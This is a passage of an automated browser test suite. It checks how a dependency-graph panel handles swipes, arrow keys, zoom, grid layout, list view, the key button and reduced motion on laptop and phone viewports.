await check('BC: from a focus a swipe, an arrow key and a press move to the neighbour that way as drawn, the picture moved as a map is, so a swipe up brings the one below; a way with no neighbour moves nowhere; on a laptop and on a phone', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1366, height: 768 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const n = await nodeAt(page, 22);
  await page.mouse.click(n.x, n.y);
  await waitNear(page, 22);
  await page.focus(STAGE_SHOWN);
  const key = async (k) => { await page.keyboard.press(k); await sleep(700); return (await nearRead(page)).num; };
  const up = await key('ArrowUp');
  const sideways = [await key('ArrowLeft'), await key('ArrowRight')];
  const down = await key('ArrowDown');
  const downAgain = await key('ArrowDown');
  // the mouse dragged up across the focus, as a finger swipes: the picture goes up, the one below comes in
  await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(400);
  const again = await nodeAt(page, 22);
  await page.mouse.click(again.x, again.y);
  await waitNear(page, 22);
  await sleep(300);
  const m = await stageMid(page);
  await drag(page, { x: m.x, y: m.y + 100 }, { x: m.x, y: m.y - 100 });
  await sleep(700);
  const swipedUp = (await nearRead(page)).num;
  const q = await nodeAt(page, 22);
  await page.mouse.click(q.x, q.y);
  await sleep(700);
  const pressed = (await nearRead(page)).num;
  console.log('     from #22: up', up, '| left and right from it', JSON.stringify(sideways), '| down', down, '| down again', downAgain, '| the mouse dragged up from #22', swipedUp, '| a press on #22', pressed);
  assert.deepEqual([up, sideways, down, downAgain], ['#99', ['#99', '#99'], '#22', '#23'], 'the arrow keys did not move the focus to the neighbour that way, or moved it where there is none');
  assert.equal(swipedUp, '#23', 'a swipe up did not bring the neighbour below');
  assert.equal(pressed, '#22', 'a neighbour pressed in the focus did not become the focus');
  assert.deepEqual(errors, []);
  await context.close();
  // a phone: a finger swiped up from #22 brings #23, swiped down from #23 brings one above
  const phone = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(phone.page);
  await phone.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(phone.page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const cdp = await phone.context.newCDPSession(phone.page);
  const t = await nodeAt(phone.page, 22);
  await phone.page.touchscreen.tap(t.x, t.y);
  await waitNear(phone.page, 22);
  await sleep(300);
  const pm = await stageMid(phone.page);
  await swipe(cdp, { x: pm.x, y: pm.y + 80 }, { x: pm.x, y: pm.y - 80 });
  await sleep(700);
  const fingerUp = (await nearRead(phone.page)).num;
  await swipe(cdp, { x: pm.x, y: pm.y - 80 }, { x: pm.x, y: pm.y + 80 });
  await sleep(700);
  const fingerDown = (await nearRead(phone.page)).num;
  const where = await panState(phone.page);
  console.log('     a finger up from #22:', fingerUp, '| then down:', fingerDown, '| the tile:', JSON.stringify(await chosen(phone.page)));
  assert.equal(fingerUp, '#23', 'a finger swiped up did not bring the neighbour below');
  assert.ok(['#21', '#22'].indexOf(fingerDown) >= 0, 'a finger swiped down did not bring a neighbour above');
  assert.deepEqual([where.tab, (await chosen(phone.page)).pressed], ['#dependencies', 'epic-20'], 'a swipe on a focus stepped to another chart or left the tab');
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
});

await check('BD: a focus goes back to the whole chart, drawn whole, by Escape on its stage or on its card, by Whole chart, by the key - and by the wheel turned outward, and Whole chart is quiet again', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1366, height: 768 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const whole = await stageRead(page);
  const openNear = async () => { const p = await nodeAt(page, 22); await page.mouse.click(p.x, p.y); await waitNear(page, 22); await sleep(300); };
  const seen = {};
  const ways = {
    'Escape on the stage': async () => { await page.focus(STAGE_SHOWN); await page.keyboard.press('Escape'); },
    'Escape on the card': async () => { await page.focus('#cp-graph .graph__section:not([hidden]) .graph__nearacts button'); await page.keyboard.press('Escape'); },
    'Whole chart': async () => { await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit'); },
    'the key -': async () => { await page.focus(STAGE_SHOWN); await page.keyboard.press('-'); },
    'the wheel outward': async () => { const m = await stageMid(page); await page.mouse.move(m.x, m.y); await page.mouse.wheel(0, 120); await page.mouse.wheel(0, 120); },
  };
  for (const [way, go] of Object.entries(ways)) {
    await openNear();
    const lit = await wholeButton(page);
    await go();
    await sleep(400);
    const n = await nearRead(page), s = await stageRead(page), b = await wholeButton(page);
    const focused = await page.evaluate(() => document.activeElement && document.activeElement.classList.contains('control__chart'));
    seen[way] = [n.open, n.whole, Math.round(s.k * 1000) / 1000, lit.idle, b.idle, focused];
    assert.deepEqual([n.open, n.whole], [false, true], way + ' did not go back to the whole chart');
    assert.ok(near1(s.k, whole.k, 1e-6), way + ' did not draw the chart whole');
    assertWhole(s, 'the chart after ' + way);
    assert.deepEqual([lit.idle, b.idle], [false, true], way + ': Whole chart was quiet on the focus or lit after it');
    if (way === 'Escape on the card') assert.equal(focused, true, 'Escape on the card did not give the keyboard back to the stage');
  }
  console.log('     closed, whole, scale, Whole chart lit before and quiet after, the stage holding the keyboard:', JSON.stringify(seen));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BE: a gesture that ends on a node presses nothing: a drag over the whole chart or one zoomed in, a finger\'s swipe too short to step, and two fingers pinching, each ending on a node, open no focus and leave the tab', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1366, height: 768 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const n = await nodeAt(page, 22);
  // the whole chart: a short drag ending on #22, from 60 px to its right
  await drag(page, { x: n.x + 60, y: n.y }, n);
  await sleep(600);
  const onWhole = await nearRead(page), wholeAfter = await stageRead(page);
  console.log('     a drag ending on a node, whole:', onWhole.open, wholeAfter.k);
  assert.equal(onWhole.open, false, 'a drag over the whole chart that ended on a node opened it in focus');
  assertWhole(wholeAfter, 'the chart after a drag too short to step');
  // zoomed in: a drag from a spot with no node ends on a node
  const r = await zoomedEpic(page);
  const t = await nodeAt(page, 23);
  await drag(page, r, t);
  await sleep(600);
  const onZoomed = await nearRead(page), state = await panState(page);
  console.log('     a drag ending on a node, zoomed in:', onZoomed.open, JSON.stringify([state.tab, state.said]));
  assert.equal(onZoomed.open, false, 'a drag over a chart zoomed in that ended on a node opened it in focus');
  assert.deepEqual([state.tab, state.said], ['#dependencies', ''], 'a drag pressed a node');
  assert.deepEqual(errors, []);
  await context.close();
  const phone = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(phone.page);
  await phone.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(phone.page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const cdp = await phone.context.newCDPSession(phone.page);
  const a = await nodeAt(phone.page, 22);
  await swipe(cdp, { x: a.x + 25, y: a.y }, a, 4);
  await sleep(600);
  const swiped = await nearRead(phone.page);
  // two fingers spread from either side of #22 and closed back onto it
  await pinch(cdp, a, 40, 120);
  await pinch(cdp, a, 120, 10);
  await sleep(600);
  const pinched = await nearRead(phone.page), end = await panState(phone.page);
  console.log('     a finger\'s short swipe ending on #22:', swiped.open, '| a pinch ending on it:', pinched.open, JSON.stringify([end.tab, end.said, (await chosen(phone.page)).pressed]));
  assert.equal(swiped.open, false, 'a finger\'s swipe that ended on a node opened it in focus');
  assert.equal(pinched.open, false, 'a pinch that ended on a node opened it in focus');
  assert.deepEqual([end.tab, end.said, (await chosen(phone.page)).pressed], ['#dependencies', '', 'epic-20'], 'a gesture pressed a node or stepped to another chart');
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
});

// under All, the smallest scale among the charts shown with the grid the page chose, and with every
// other number of columns set by hand on the charts' box, each read once the stages have fitted
// themselves again; a chart with a node outside its stage, as one whose stage is too small to fit
// it, counts as drawn at nothing
const gridChoices = (page) => page.evaluate(async () => {
  const box = document.getElementById('cp-graph');
  const cells = Array.from(box.querySelectorAll('.graph__section')).filter((s) => !s.hidden);
  const frame = () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
  const least = () => Math.min.apply(null, cells.map((s) => {
    const host = s.querySelector('.control__chart'), svg = host.querySelector(':scope > svg'), b = host.getBoundingClientRect();
    const m = /scale\(([0-9.e-]+)\)/.exec(svg.style.transform);
    const out = Array.from(svg.querySelectorAll('g.node')).some((g) => { const r = g.getBoundingClientRect(); return r.left < b.left - 1 || r.right > b.right + 1 || r.top < b.top - 1 || r.bottom > b.bottom + 1; });
    return m && !out ? Number(m[1]) : 0;
  }));
  const chosen = [box.style.gridTemplateColumns, box.style.gridTemplateRows];
  const seen = {};
  for (let cols = 1; cols <= cells.length; cols++) {
    box.style.gridTemplateColumns = 'repeat(' + cols + ', minmax(0, 1fr))';
    box.style.gridTemplateRows = 'repeat(' + Math.ceil(cells.length / cols) + ', minmax(0, 1fr))';
    await frame();
    await frame();
    seen[cols] = Math.round(least() * 10000) / 10000;
  }
  box.style.gridTemplateColumns = chosen[0];
  box.style.gridTemplateRows = chosen[1];
  await frame();
  await frame();
  return { chosen: Number((/repeat\(([0-9]+)/.exec(chosen[0]) || [])[1]), seen };
});
await check('BF: All shows every chart at once in a grid that fits the charts\' box, each chart whole in its cell with nothing past its box, in the grid that draws the smallest chart the largest at the usual and the largest text sizes, and a press on a cell, by the mouse or a finger, opens that chart alone', async () => {
  for (const [width, height, mobile] of [[1366, 768], [390, 844, true]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(manyRoutes(5, true), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 6 reads/, 30000);
    await pick(page, 'all');
    await sleep(400);
    const grid = await page.evaluate(() => {
      const box = document.getElementById('cp-graph'), b = box.getBoundingClientRect();
      const cells = Array.from(box.querySelectorAll('.graph__section')).filter((s) => !s.hidden);
      return { all: box.classList.contains('graph--all'), cells: cells.length, columns: getComputedStyle(box).gridTemplateColumns.split(' ').length,
        outside: cells.filter((s) => { const r = s.getBoundingClientRect(); return r.left < b.left - 1 || r.right > b.right + 1 || r.top < b.top - 1 || r.bottom > b.bottom + 1; }).map((s) => s.getAttribute('data-focus')) };
    });
    const over = await overflows(page);
    const scales = [];
    for (const k of await shownKeys(page)) { const s = await stageRead(page, stageOfCard(k)); assertWhole(s, what + ', All, the chart ' + k); scales.push(Math.round(s.k * 1000) / 1000); }
    const cell = await stageMid(page, stageOfCard('epic-300'));
    if (mobile) await page.touchscreen.tap(cell.x, cell.y); else await page.mouse.click(cell.x, cell.y);
    await sleep(700);
    const opened = await chosen(page), s = await stageRead(page);
    console.log('     ' + what + ': All', JSON.stringify(grid), JSON.stringify(scales), '| a press on epic #300\'s cell:', JSON.stringify(opened), s.k);
    assert.deepEqual([grid.all, grid.cells, grid.outside], [true, 6, []], what + ': All does not show the six charts inside the charts\' box');
    assert.deepEqual(over, [], what + ': under All something holds more than its box: ' + over.join('; '));
    assert.deepEqual(opened, { pressed: 'epic-300', shown: 'epic-300' }, what + ': a press on a cell under All did not open its chart alone');
    assertWhole(s, what + ', epic #300 opened from All');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  // a laptop at the usual text size and at a large one, where each cell's title takes more of it
  const { context, page, errors } = await open(manyRoutes(6, true), { viewport: { width: 1280, height: 800 } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 7 reads/, 30000);
  await pick(page, 'all');
  await sleep(400);
  const usual = await gridChoices(page);
  await textTo(page, '#cp-zoom-up', 5);
  await pick(page, 'goals');
  await pick(page, 'all');
  await sleep(400);
  const large = await gridChoices(page), size = await textSize(page);
  console.log('     1280 x 800, the smallest chart\'s scale by columns: at 100%', JSON.stringify(usual), '| at ' + size, JSON.stringify(large));
  for (const [at, g] of [['100%', usual], [size, large]]) {
    const most = Math.max.apply(null, Object.values(g.seen));
    assert.ok(most > 0 && g.seen[g.chosen] >= most - 1e-4, 'at ' + at + ' All\'s grid of ' + g.chosen + ' columns draws the smallest chart at ' + g.seen[g.chosen] + ', where another draws it at ' + most);
  }
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BG: a swipe across a whole chart steps to the chart beside it, the picture moved as a map is, so a swipe to the left brings the next, by the mouse and by a finger; one up or down, or past the last chart, stays; and the left and right arrow keys on the stage step the same way', async () => {
  const { context, page, errors } = await open(manyRoutes(3), { viewport: { width: 1280, height: 800 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-100' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 30000);
  await sleep(300);
  const m = await stageMid(page);
  const shown = async () => { await sleep(500); return (await chosen(page)).shown; };
  await drag(page, { x: m.x + 120, y: m.y }, { x: m.x - 120, y: m.y + 10 });
  const left = await shown();
  await drag(page, { x: m.x - 120, y: m.y }, { x: m.x + 120, y: m.y });
  const right = await shown();
  await drag(page, { x: m.x, y: m.y - 100 }, { x: m.x + 20, y: m.y + 100 });
  const vertical = await shown();
  const afterVertical = await stageRead(page);
  await page.focus(STAGE_SHOWN);
  await page.keyboard.press('ArrowRight');
  const keyRight = await shown();
  await page.keyboard.press('ArrowLeft');
  const keyLeft = await shown();
  const keyed = await page.evaluate(() => document.activeElement && document.activeElement.closest('.graph__section').getAttribute('data-focus'));
  await pick(page, 'epic-300');
  await sleep(300);
  await drag(page, { x: m.x + 120, y: m.y }, { x: m.x - 120, y: m.y });
  const pastLast = await shown();
  const lastStage = await stageRead(page);
  console.log('     from epic #100: dragged left', left, '| right', right, '| down', vertical, '| ArrowRight', keyRight, '| ArrowLeft', keyLeft, '(the keyboard on', keyed + ') | dragged left on the last', pastLast);
  assert.deepEqual([left, right, vertical, keyRight, keyLeft, pastLast], ['epic-200', 'epic-100', 'epic-100', 'epic-200', 'epic-100', 'epic-300'], 'a swipe or an arrow key did not step to the chart beside it, or stepped where it should not');
  assert.equal(keyed, 'epic-100', 'the keyboard did not stay on the card the arrow key showed');
  assertWhole(afterVertical, 'the chart after a drag up or down');
  assertWhole(lastStage, 'the last chart after a swipe past it');
  assert.deepEqual(errors, []);
  await context.close();
  const phone = await open(manyRoutes(3), { viewport: { width: 390, height: 844 }, mobile: true, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-100' }) } });
  await signIn(phone.page);
  await phone.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(phone.page, /^Drawn from 4 reads/, 30000);
  await sleep(300);
  const cdp = await phone.context.newCDPSession(phone.page);
  const pm = await stageMid(phone.page);
  const win = (await panState(phone.page)).win;
  await swipe(cdp, { x: pm.x + 80, y: pm.y }, { x: pm.x - 100, y: pm.y + 6 });
  await sleep(500);
  const fingerLeft = (await chosen(phone.page)).shown;
  await swipe(cdp, { x: pm.x - 80, y: pm.y }, { x: pm.x + 100, y: pm.y });
  await sleep(500);
  const fingerRight = (await chosen(phone.page)).shown, end = await panState(phone.page);
  console.log('     a finger from epic #100: left', fingerLeft, '| right', fingerRight, '| the page', JSON.stringify([win, end.win]));
  assert.deepEqual([fingerLeft, fingerRight], ['epic-200', 'epic-100'], 'a finger\'s swipe did not step to the chart beside it');
  assert.equal(end.win, win, 'the swipe moved the page');
  assert.deepEqual(phone.errors, []);
  await phone.context.close();
});

await check('BH: Chart and List switch a card between its picture and the same in words in its place, the list fitted to the card whole as the chart is, shrunk where it is larger and never scrolling, its words unchanged; and Chart brings the picture back whole', async () => {
  const listState = (page) => page.evaluate(() => {
    const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), list = sec.querySelector('.graph__list'), table = list.querySelector('table');
    const l = list.getBoundingClientRect(), t = table.getBoundingClientRect(), m = /scale\(([0-9.e-]+)\)/.exec(table.style.transform);
    return { view: sec.getAttribute('data-view'), pressed: Array.from(sec.querySelectorAll('.graph__view')).filter((b) => b.getAttribute('aria-pressed') === 'true').map((b) => b.textContent).join(),
      chart: sec.querySelector('.control__chart').hidden, list: list.hidden, scale: m ? Number(m[1]) : 1, inside: t.left >= l.left - 1 && t.right <= l.right + 1 && t.top >= l.top - 1 && t.bottom <= l.bottom + 1,
      scrolled: [list.scrollLeft, list.scrollTop], rows: Array.from(table.querySelectorAll('tbody tr')).map((tr) => tr.querySelector('td').textContent), words: table.textContent.length };
  });
  for (const [width, height, mobile, routes, key, rows] of [[1366, 768, false, fixtureRoutes(fixture()), 'epic-20', ['#21', '#22', '#23', '#99']], [844, 390, true, wideRoutes(), 'epic-70', Array.from({ length: 12 }, (_, i) => '#' + (71 + i))]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(routes, { viewport: { width, height }, mobile, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': key }) } });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from [0-9]+ reads?/, 15000);
    await sleep(300);
    const words = await page.$eval('#cp-graph .graph__section[data-focus="' + key + '"] .graph__list table', (t) => t.textContent.length);
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__view[data-view="list"]');
    await sleep(400);
    const asList = await listState(page), over = await overflows(page);
    // the last row's button given the keyboard, and the wheel turned over the list, scroll nothing
    await page.focus('#cp-graph .graph__section:not([hidden]) .graph__list tbody tr:last-child button');
    const box = await page.$eval('#cp-graph .graph__section:not([hidden]) .graph__list', (l) => { const b = l.getBoundingClientRect(); return { x: b.left + b.width / 2, y: b.top + b.height / 2 }; });
    await page.mouse.move(box.x, box.y);
    await page.mouse.wheel(0, 200);
    await sleep(300);
    const tried = await listState(page);
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__view[data-view="chart"]');
    await sleep(400);
    const asChart = await listState(page), s = await stageRead(page);
    console.log('     ' + what + ': List', JSON.stringify(asList), '| after the keyboard and the wheel:', JSON.stringify(tried.scrolled), '| Chart', JSON.stringify([asChart.view, asChart.pressed, asChart.chart, asChart.list]), s.k);
    assert.deepEqual([asList.view, asList.pressed, asList.chart, asList.list, asList.rows], ['list', 'List', true, false, rows], what + ': List did not show the list in the chart\'s place');
    assert.ok(asList.inside && asList.scale <= 1, what + ': the list is not fitted to its card: ' + JSON.stringify(asList));
    assert.deepEqual([asList.scrolled, tried.scrolled, tried.inside], [[0, 0], [0, 0], true], what + ': the list scrolled when its last button took the keyboard or the wheel turned over it');
    assert.deepEqual(over, [], what + ': with the list shown something holds more than its box: ' + over.join('; '));
    assert.equal(asList.words, words, what + ': the list\'s words changed when it was fitted');
    assert.deepEqual([asChart.view, asChart.pressed, asChart.chart, asChart.list], ['chart', 'Chart', false, true], what + ': Chart did not bring the picture back');
    assertWhole(s, what + ', the chart after Chart');
    if (mobile) assert.ok(asList.scale < 1, what + ': the twelve rows fit a phone held sideways at their own size, so the fit says nothing');
    assert.deepEqual(errors, [], what);
    await context.close();
  }
});

await check('BI: on a phone the key folds behind its Key button, which opens it over the stage and closes it by Escape, giving the keyboard back to the button, and by a press anywhere else; on a monitor the key stands in its line with no button', async () => {
  const keyState = (page) => page.evaluate(() => {
    const k = document.getElementById('cp-graph-key'), b = document.getElementById('cp-graph-keybtn'), r = k.getBoundingClientRect();
    return { fold: document.getElementById('tab-dependencies').classList.contains('graph--keyfold'), key: getComputedStyle(k).display, button: getComputedStyle(b).display, expanded: b.getAttribute('aria-expanded'),
      onScreen: r.width > 0 && r.left >= -1 && r.right <= innerWidth + 1 && r.top >= -1 && r.bottom <= innerHeight + 1, focused: document.activeElement === b };
  });
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const folded = await keyState(page);
  console.log('     a phone: folded', JSON.stringify(folded));
  assert.deepEqual([folded.fold, folded.key, folded.button === 'none', folded.expanded], [true, 'none', false, 'false'], 'the key does not fold behind its button on a phone');
  await page.click('#cp-graph-keybtn');
  const opened = await keyState(page);
  await page.keyboard.press('Escape');
  const escaped = await keyState(page);
  await page.click('#cp-graph-keybtn');
  const again = await keyState(page);
  const m = await stageMid(page);
  await page.touchscreen.tap(m.x, m.y);
  await sleep(300);
  const outside = await keyState(page);
  console.log('     a phone: opened', JSON.stringify(opened), '| Escape', JSON.stringify(escaped), '| a press elsewhere', JSON.stringify(outside));
  assert.deepEqual([opened.key, opened.expanded, opened.onScreen], ['flex', 'true', true], 'the Key button did not open the key on the screen');
  assert.deepEqual([escaped.key, escaped.expanded, escaped.focused], ['none', 'false', true], 'Escape did not close the key and give the keyboard back to its button');
  assert.equal(again.key, 'flex');
  assert.deepEqual([outside.key, outside.expanded], ['none', 'false'], 'a press elsewhere did not close the key');
  assert.deepEqual(errors, []);
  await context.close();
  const wide = await open(fixtureRoutes(fixture()), { viewport: { width: 1920, height: 1080 } });
  await signIn(wide.page);
  await waitGraph(wide.page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  const inline = await keyState(wide.page);
  console.log('     a monitor:', JSON.stringify(inline));
  assert.deepEqual([inline.fold, inline.key, inline.button, inline.onScreen], [false, 'flex', 'none', true], 'the key does not stand in its line on a monitor');
  assert.deepEqual(wide.errors, []);
  await wide.context.close();
});

await check('BJ: where the system asks for less motion the zoom\'s steps jump with no glide and a focus opens with no fade, and otherwise they glide and fade', async () => {
  const motion = (page) => page.evaluate(() => {
    const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), svg = Array.from(sec.querySelectorAll('.control__chart > svg')).find((x) => x.style.display !== 'none');
    return { glide: svg.classList.contains('stage__glide'), transition: getComputedStyle(svg).transitionDuration, fade: getComputedStyle(svg).animationName };
  });
  const seen = {};
  for (const reducedMotion of ['no-preference', 'reduce']) {
    const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1366, height: 768 }, reducedMotion, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 4 reads/, 15000);
    await sleep(300);
    await page.click(ZOOM_IN);
    const step = await motion(page);
    await page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
    await sleep(400);
    const p = await nodeAt(page, 22);
    await page.mouse.click(p.x, p.y);
    await waitNear(page, 22);
    const focus = await motion(page);
    seen[reducedMotion] = { step, focus };
    assert.deepEqual(errors, [], reducedMotion);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
  assert.deepEqual([seen['no-preference'].step.glide, seen['no-preference'].step.transition, seen['no-preference'].focus.fade], [true, '0.22s', 'graph-enter'], 'the zoom\'s step does not glide or the focus does not fade');
  assert.deepEqual([seen.reduce.step.glide, seen.reduce.step.transition, seen.reduce.focus.fade], [false, '0s', 'none'], 'the zoom glides or the focus fades where the system asks for less motion');
});

await check('BK: the Board tab\'s charts open whole on their stages at most at their own size and zoom by their + and the trackpad\'s pinch, holding the finger once zoomed, but leave the plain wheel to the board, which scrolls; Whole chart draws them whole again and a press opens a node in focus there, drawn whole', async () => {
  const routes = fixtureRoutes(fixture());
  const notes = '\n## Notes\n\n' + Array.from({ length: 60 }, (_, i) => 'A line of notes, number ' + (i + 1) + '.').join('\n\n') + '\n';
  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(boardWith([['Goals', GOALS_TEXT], ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT]]) + notes) };
  const { context, page, errors } = await open(routes, { viewport: { width: 1366, height: 768 } });
  await signIn(page);
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
  await toTab(page, 'board');
  await sleep(500);
  await page.$$eval('#cp-board .control__chart', (hs) => hs.forEach((h, i) => h.setAttribute('data-check', String(i))));
  const host = '#cp-board .control__chart[data-check="1"]';
  const whole = [await stageRead(page, '#cp-board .control__chart[data-check="0"]'), await stageRead(page, host)];
  whole.forEach((s, i) => assertWhole(s, 'the board\'s chart ' + i));
  // the chart's own tools, which stand just before it
  const tool = (sel) => page.$eval(host, (h, sel) => h.previousElementSibling.querySelector(sel).click(), sel);
  const touch = () => page.$eval(host, (h) => getComputedStyle(h).touchAction);
  const boxTop = () => page.$eval('#tab-board .console__scroll', (b) => b.scrollTop);
  const atRest = await touch();
  // the epic's chart brought into the middle of the board's box, as a person scrolls to it
  const settle = () => page.$eval(host, (h) => h.scrollIntoView({ block: 'center', behavior: 'instant' }));
  await settle();
  await sleep(200);
  // the plain wheel over a whole chart scrolls the board and zooms nothing
  const m = await stageMid(page, host);
  await page.mouse.move(m.x, m.y);
  const top0 = await boxTop();
  await page.mouse.wheel(0, 120);
  await sleep(400);
  const wheeled = await stageRead(page, host), top1 = await boxTop();
  await settle();
  await sleep(200);
  // the trackpad's pinch zooms it about the pointer and scrolls nothing
  const m2 = await stageMid(page, host), top2before = await boxTop();
  await page.mouse.move(m2.x, m2.y);
  await page.keyboard.down('Control');
  await page.mouse.wheel(0, -30);
  await page.keyboard.up('Control');
  await sleep(300);
  const pinched = await stageRead(page, host), top2 = await boxTop(), held = await touch();
  await tool('.graph__fit');
  await sleep(400);
  const back = await stageRead(page, host);
  await tool('[aria-label="Zoom in"]');
  await sleep(400);
  const plus = await stageRead(page, host);
  await tool('.graph__fit');
  await sleep(400);
  await settle();
  await sleep(200);
  const n = await nodeAt(page, 22, host);
  await page.mouse.click(n.x, n.y);
  await page.waitForFunction(() => { const x = document.querySelector('#cp-board .graph__near--board:not([hidden]) .graph__nearnum'); return x && x.textContent === '#22'; }, null, { timeout: 8000 });
  await sleep(300);
  const focus = await stageRead(page, host);
  console.log('     whole:', JSON.stringify(whole.map((s) => [s.k, s.box])), '| at rest the finger:', atRest, '| the plain wheel:', wheeled.k, JSON.stringify([top0, top1]), '| ctrl and the wheel:', pinched.k, JSON.stringify([top2before, top2]), held, '| Whole chart:', back.k, '| +:', plus.k, '| focus:', focus.k, JSON.stringify(focus.nodes.map((x) => x.n).sort()));
  assert.equal(atRest, 'pan-y', 'a whole board chart takes the finger\'s scroll of the board');
  assert.ok(near1(wheeled.k, whole[1].k, 1e-6), 'the plain wheel zoomed a board chart');
  assert.ok(top1 > top0, 'the plain wheel over a board chart did not scroll the board');
  assert.ok(near1(pinched.k / whole[1].k, Math.exp(0.3)), 'the trackpad\'s pinch did not zoom a board chart: ' + pinched.k);
  assert.deepEqual([top2, held], [top2before, 'none'], 'the trackpad\'s pinch scrolled the board, or the zoomed chart does not hold the finger');
  assert.ok(near1(back.k, whole[1].k, 1e-6), 'Whole chart did not draw the board chart whole again');
  assert.ok(near1(plus.k / whole[1].k, 1.4), 'the board chart\'s + did not zoom in');
  assert.ok(focus.near && JSON.stringify(focus.nodes.map((x) => x.n).sort((a, b) => a - b)) === '[22,23,99]', 'the press did not open #22 in focus with its neighbours');
  assertFocus(focus, 'the board chart\'s focus', back.k);
  assert.deepEqual(errors, []);
  await context.close();
});

// The zoom's review (2026-10-19, after BK): what four reviewers found the checks above let through.
// A phone held either way keeps the page still while the tab is shown (BL); the tab's help never
// scrolls (BM); a card's list is a stage of its own (BN); a focus's card keeps its state, its link
// and Centre its row in sight and names each neighbour as a button (BO); the mouse's zoom keeps the
// point under it and a slow double click is still one (BP); a chart turns to the layout its stage
// draws larger, and a hub's focus comes up larger (BQ); a finger's gestures (BR); All's pages (BS);
// a short tab's tiles, a long heading and the folded key on a computer (BT); and the stage's
// smaller promises (BU).

// a point's place on the screen, the middle of the first element a selector names that is shown
const midOf = (page, sel) => page.evaluate((sel) => {
  const e = Array.from(document.querySelectorAll(sel)).find((x) => x.getClientRects().length && getComputedStyle(x).visibility !== 'hidden');
  if (!e) return null;
  const b = e.getBoundingClientRect();
  return { x: b.left + b.width / 2, y: b.top + b.height / 2 };
}, sel);
const scrollAt = (page) => page.evaluate(() => ({ y: Math.round(window.scrollY), scale: window.visualViewport ? Math.round(window.visualViewport.scale * 1000) / 1000 : 1 }));
// where the shown card's stage stands on the screen against the note over the screen's foot where
// one shows, else the screen's bottom
const stageAgainstFoot = (page) => page.evaluate(() => {
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), st = sec.querySelector('.control__chart').getBoundingClientRect();
  return { top: Math.round(st.top), bottom: Math.round(st.bottom), height: Math.round(st.height), foot: Math.round((document.getElementById('msg').firstChild ? document.querySelector('.console__status').getBoundingClientRect().top : innerHeight)) };
});

